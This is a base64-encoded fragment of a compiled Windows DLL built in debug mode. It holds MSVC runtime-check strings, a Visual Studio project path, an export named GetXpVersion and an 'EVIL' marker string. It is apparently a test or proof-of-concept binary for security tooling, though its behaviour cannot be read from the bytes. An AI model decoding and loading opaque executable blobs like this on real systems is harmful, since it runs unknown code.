AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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UFwcGxpY2F0aW9uNlx4NjRcRGVidWdcQ29uc29sZUFwcGxpY2F0aW9uNi5wZGIAAAAAAAAAABkAAAAZAAAAAwAAABYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF4RAYABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGQQAYABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/////wAAAAABAAAAAQAAAAEAAAABAAAAAQAAAAAAAAABAAAAAgAAAC8gAAAAAAAAAAAAAAAAAAAyot8tmSsAAM1dINJm1P//AAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA